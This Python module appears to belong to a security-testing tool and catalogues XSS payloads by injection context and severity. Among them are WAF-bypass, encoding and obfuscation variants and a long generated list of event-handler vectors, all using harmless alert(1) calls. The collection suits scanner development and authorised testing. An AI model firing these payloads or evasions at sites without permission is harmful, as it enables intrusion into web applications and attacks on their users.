"""
Comprehensive XSS (Cross-Site Scripting) payload database.
Contains various XSS payloads categorized by context and evasion techniques.
"""

from dataclasses import dataclass
from enum import Enum


class PayloadContext(Enum):
    """Payload contexts for different injection points."""

    URL = "url"
    FORM = "form"
    HEADER = "header"
    COOKIE = "cookie"
    HTML = "html"
    JAVASCRIPT = "javascript"
    CSS = "css"
    ATTRIBUTE = "attribute"


class PayloadSeverity(Enum):
    """Payload severity levels."""

    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class XSSPayload:
    """XSS payload with metadata."""

    payload: str
    description: str
    context: PayloadContext
    severity: PayloadSeverity
    bypass_techniques: list[str]
    requires_interaction: bool = False


class XSSPayloads:
    """XSS payload database manager."""

    def __init__(self):
        """Initialize XSS payloads."""
        self._payloads = self._load_payloads()

    def _load_payloads(self) -> list[XSSPayload]:
        """Load all XSS payloads."""
        payloads = []

        # Basic alert payloads
        basic_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            '<iframe src="javascript:alert(1)">',
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video src=x onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
        ]

        for payload in basic_payloads:
            payloads.append(
                XSSPayload(
                    payload=payload,
                    description="Basic XSS alert payload",
                    context=PayloadContext.HTML,
                    severity=PayloadSeverity.HIGH,
                    bypass_techniques=["direct_injection"],
                )
            )

        # URL context payloads
        url_payloads = [
            "javascript:alert(1)",
            "javascript:alert(String.fromCharCode(88,83,83))",
            'javascript:eval(atob("YWxlcnQoMSk="))',
            'javascript:Function("alert(1)")()',
            "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        ]

        for payload in url_payloads:
            payloads.append(
                XSSPayload(
                    payload=payload,
                    description="URL-based XSS payload",
                    context=PayloadContext.URL,
                    severity=PayloadSeverity.HIGH,
                    bypass_techniques=["url_scheme", "encoding"],
                )
            )

        # Form context payloads
        form_payloads = [
            '"><script>alert(1)</script>',
            "';alert(1);//",
            "</textarea><script>alert(1)</script>",
            "</select><script>alert(1)</script>",
            "</option><script>alert(1)</script>",
            "</title><script>alert(1)</script>",
            "</style><script>alert(1)</script>",
        ]

        for payload in form_payloads:
            payloads.append(
                XSSPayload(
                    payload=payload,
                    description="Form input XSS payload",
                    context=PayloadContext.FORM,
                    severity=PayloadSeverity.HIGH,
                    bypass_techniques=["context_breaking"],
                )
            )

        # Attribute context payloads
        attr_payloads = [
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)",
            "> <script>alert(1)</script>",
            '"/> <script>alert(1)</script>',
            'x" autofocus onfocus="alert(1)',
            "x' autofocus onfocus='alert(1)",
        ]

        for payload in attr_payloads:
            payloads.append(
                XSSPayload(
                    payload=payload,
                    description="HTML attribute XSS payload",
                    context=PayloadContext.ATTRIBUTE,
                    severity=PayloadSeverity.MEDIUM,
                    bypass_techniques=["attribute_breaking"],
                    requires_interaction=True,
                )
            )

        # JavaScript context payloads
        js_payloads = [
            "';alert(1);//",
            '";alert(1);//',
            ";}alert(1);//",
            "});alert(1);//",
            "\\';alert(1);//",
            '\\";alert(1);//',
        ]

        for payload in js_payloads:
            payloads.append(
                XSSPayload(
                    payload=payload,
                    description="JavaScript context XSS payload",
                    context=PayloadContext.JAVASCRIPT,
                    severity=PayloadSeverity.HIGH,
                    bypass_techniques=["js_breaking"],
                )
            )

        # CSS context payloads
        css_payloads = [
            "</style><script>alert(1)</script>",
            "expression(alert(1))",
            "url(javascript:alert(1))",
            '@import"javascript:alert(1)"',
        ]

        for payload in css_payloads:
            payloads.append(
                XSSPayload(
                    payload=payload,
                    description="CSS context XSS payload",
                    context=PayloadContext.CSS,
                    severity=PayloadSeverity.MEDIUM,
                    bypass_techniques=["css_breaking"],
                )
            )

        # WAF bypass payloads
        waf_bypass_payloads = [
            # Case variation
            "<ScRiPt>alert(1)</ScRiPt>",
            "<SCRIPT>alert(1)</SCRIPT>",
            # Encoding bypasses
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            # Comment insertion
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<script>al/**/ert(1)</script>",
            "<script>a\u006cert(1)</script>",
            # Whitespace variations
            "<script\x09>alert(1)</script>",
            "<script\x0A>alert(1)</script>",
            "<script\x0D>alert(1)</script>",
            "<script\x20>alert(1)</script>",
            "<script\x0C>alert(1)</script>",
            # Alternative vectors
            "<svg><script>alert(1)</script></svg>",
            "<math><script>alert(1)</script></math>",
            "<foreignObject><script>alert(1)</script></foreignObject>",
            # Filter bypasses
            "<script>alert(/XSS/)</script>",
            "<script>a=alert,a(1)</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
            "<script>setTimeout(alert(1),0)</script>",
            '<script>Function("alert(1)")()</script>',
            '<script>[].constructor.constructor("alert(1)")()</script>',
            # Polyglot payloads
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=+/"/+/onmouseover=1/+/[*/[]/+alert(1)//',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            # Browser-specific bypasses
            "<script src=data:text/javascript,alert(1)></script>",
            '<link rel=stylesheet href="javascript:alert(1)">',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            '<applet code="javascript:alert(1)">',
            # DOM-based vectors
            '<script>document.location="javascript:alert(1)"</script>',
            '<script>window.location="javascript:alert(1)"</script>',
            '<script>top.location="javascript:alert(1)"</script>',
            '<script>parent.location="javascript:alert(1)"</script>',
            # Template injection style
            "{{alert(1)}}",
            "${alert(1)}",
            "#{alert(1)}",
            "%{alert(1)}",
            "[[alert(1)]]",
            # Advanced evasions
            "<script>eval(\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029)</script>",
            "<script>eval(\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29)</script>",
            '<script>eval("\\141\\154\\145\\162\\164\\50\\61\\51")</script>',
        ]

        for payload in waf_bypass_payloads:
            payloads.append(
                XSSPayload(
                    payload=payload,
                    description="WAF bypass XSS payload",
                    context=PayloadContext.HTML,
                    severity=PayloadSeverity.HIGH,
                    bypass_techniques=["waf_bypass", "encoding", "obfuscation"],
                )
            )

        # Event handler payloads
        event_handlers = [
            "onload",
            "onerror",
            "onmouseover",
            "onclick",
            "onfocus",
            "onblur",
            "onchange",
            "onsubmit",
            "onreset",
            "onselect",
            "onkeydown",
            "onkeypress",
            "onkeyup",
            "onmousedown",
            "onmouseup",
            "onmousemove",
            "onmouseout",
            "onmouseenter",
            "onmouseleave",
            "ondblclick",
            "oncontextmenu",
            "onwheel",
            "ondrag",
            "ondragstart",
            "ondragend",
            "ondragover",
            "ondragenter",
            "ondragleave",
            "ondrop",
            "onscroll",
            "oncopy",
            "oncut",
            "onpaste",
            "onabort",
            "oncanplay",
            "oncanplaythrough",
            "ondurationchange",
            "onemptied",
            "onended",
            "onloadeddata",
            "onloadedmetadata",
            "onloadstart",
            "onpause",
            "onplay",
            "onplaying",
            "onprogress",
            "onratechange",
            "onseeked",
            "onseeking",
            "onstalled",
            "onsuspend",
            "ontimeupdate",
            "onvolumechange",
            "onwaiting",
            "oninput",
            "oninvalid",
            "onsearch",
        ]

        for handler in event_handlers:
            payload = f"<img src=x {handler}=alert(1)>"
            payloads.append(
                XSSPayload(
                    payload=payload,
                    description=f"Event handler XSS using {handler}",
                    context=PayloadContext.HTML,
                    severity=PayloadSeverity.MEDIUM,
                    bypass_techniques=["event_handler"],
                    requires_interaction=(handler not in ["onload", "onerror", "onfocus"]),
                )
            )

        return payloads

    def get_all_payloads(self) -> list[XSSPayload]:
        """Get all XSS payloads."""
        return self._payloads

    def get_payloads_for_context(self, context: str) -> list[XSSPayload]:
        """Get payloads for specific context."""
        context_enum = PayloadContext(context.lower())
        return [p for p in self._payloads if p.context == context_enum]

    def get_payloads_by_severity(self, severity: str) -> list[XSSPayload]:
        """Get payloads by severity level."""
        severity_enum = PayloadSeverity(severity.lower())
        return [p for p in self._payloads if p.severity == severity_enum]

    def get_basic_payloads(self, limit: int = 10) -> list[XSSPayload]:
        """Get basic XSS payloads for quick testing."""
        basic = [p for p in self._payloads if "direct_injection" in p.bypass_techniques]
        return basic[:limit]

    def get_advanced_payloads(self, limit: int = 50) -> list[XSSPayload]:
        """Get advanced XSS payloads for thorough testing."""
        advanced = [
            p for p in self._payloads if "waf_bypass" in p.bypass_techniques or "obfuscation" in p.bypass_techniques
        ]
        return advanced[:limit]

    def get_payload_count(self) -> int:
        """Get total number of payloads."""
        return len(self._payloads)

    def search_payloads(self, keyword: str) -> list[XSSPayload]:
        """Search payloads by keyword."""
        keyword = keyword.lower()
        return [p for p in self._payloads if keyword in p.payload.lower() or keyword in p.description.lower()]
